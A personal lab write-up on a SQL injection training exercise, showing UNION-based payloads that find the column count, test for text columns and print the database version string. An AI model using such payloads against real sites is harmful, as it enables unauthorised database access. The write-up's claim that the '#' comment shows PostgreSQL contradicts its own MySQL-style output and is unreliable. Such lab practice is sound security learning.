This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

---

Analysis:

- I have to use a `#` to comment out the request indicating it's postgreSQL

```php
'+UNION+SELECT+NULL,+NULL#
```

- I find that there is two columns. 
- With the following command i find that both columns contain text.

```php
'+UNION+SELECT+'aa',+'aa'# 
```

- Looking at the chat sheet i'm provided the following syntax to check the database version.

PostgreSQL:

```php
SELECT version()
```

- I use this to finish the lab.

```php
'+UNION+SELECT+'aa',+version()#
```

Output:

`8.0.39-0ubuntu0.20.04.1`

I can't search for that if i write a script because it already says it on the page in the description of what to do, so i'll have to use something else like the status code `200`.

![[Pasted image 20240901091620.png]]

Other than a python script that completes the lab.

---

**Completed:** _09:03 2024-09-01_


